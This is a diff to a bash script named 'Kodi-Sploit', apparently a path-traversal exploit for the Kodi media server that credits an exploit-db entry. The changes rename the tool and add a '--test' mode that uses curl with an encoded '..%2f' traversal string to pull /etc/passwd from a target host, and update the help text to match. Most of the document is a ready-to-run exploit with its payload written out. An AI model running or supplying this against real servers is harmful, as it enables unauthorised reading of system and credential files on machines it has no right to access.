@@ -1,12 +1,11 @@
 #!/bin/bash
 #############################################################
-# Kodi file fetch                                  ##########
+# Kodi-Sploit                                      ##########
 # Author DarkerEgo                                 ########
 # GPL 2015                                         #####
 # https://www.exploit-db.com/exploits/38833/       ###
 #####################################################
 
-# EXAMPLE: #http://victim//%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/%2fetc%2fpasswd
 
 host=$1
 exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
@@ -41,9 +40,18 @@ echo "URL for path $lpath: "
 echo $lpath
 
 ;;
+ -t|--test) echo 'Trying to grab /etc/passwd...'
+
+exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
+curl -k $2/$exploit//etc/passwd
+
+
+;;
  --help|-h)     echo "USAGE: $0 <host> path <1.2.3.4> </etc/passwd>"
 		echo '--print|-P : Print URL Only, do not connect'
+		echo '--test|-t : Determine if server is vulnerable, try to get /etc/passwd'
 		echo  '--help|-h> : Display this help'
+		
 ;;
  *) host=$1
 exploit="/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"
